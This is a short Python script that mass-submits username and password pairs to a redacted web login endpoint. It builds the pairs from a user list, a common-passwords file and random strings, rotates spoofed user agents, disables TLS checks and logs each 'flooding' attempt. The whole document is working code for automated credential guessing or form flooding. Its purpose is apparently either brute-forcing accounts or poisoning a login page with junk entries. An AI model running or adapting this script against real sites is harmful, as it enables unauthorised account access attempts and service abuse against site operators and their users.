import requests
import random
from user_agent import generate_user_agent
import string

def make_the_call(username='', password=''):
    origin = 'http://REDACTED'
    referer = 'http://REDACTED'
    endpoint = 'http://REDACTED'

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Origin': origin,
        'Upgrade-Insecure-Requests': '1',
        'DNT': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Referer': referer,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,it;q=0.8',
    }
    data = {
      'nome': username,
      'pass': password
    }
    headers['User-Agent'] = generate_user_agent()
    response = requests.post(endpoint, headers=headers, data=data, verify=False, allow_redirects=False)
    return response

def randomString(stringLength=10, with_numbers=0, with_symbols=0):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    if with_numbers == 1:
        letters += '0123456789'
    if with_symbols < 3:
        symbols = '!@#$%^&*()_-+={}[]|\:;<,>.?/'
        letters += ''.join([random.choice(symbols) for _ in range(int(len(symbols)*0.5))])
    return ''.join(random.choice(letters) for _ in range(stringLength))

def generate_username_list():
    with open('./users.txt') as f:
        content = f.readlines()
    return [x.strip().replace("\n", "").split("@")[0] for x in content if '@' in x]

def generate_password_list():
    with open('./10k-most-common.txt') as f:
        content = f.readlines()
    content = [x.strip().replace("\n", "") for x in content]
    generated = [randomString(random.randint(4, 14), random.randint(0, 1), random.randint(0, 10)) for _ in range(len(content))]
    final = content + generated + [top10k + randomString(random.randint(0, 3), 1, random.randint(0, 10)) for top10k in content]
    return list(set(final))

usernames = generate_username_list()
random.shuffle(usernames)
print("Usernames sample set", usernames[:10])

passwords = generate_password_list()
random.shuffle(passwords)
print("Passwords sample set", passwords[:10])

to_be_dumped = [(u, p) for u, p in zip(usernames, passwords)]
print('Ready to dump {} items'.format(len(to_be_dumped)))

for username, password in to_be_dumped:
    response = make_the_call(username, password)
    print('Flodding with {}:{} --> response: {}'.format(username, password, response.status_code))
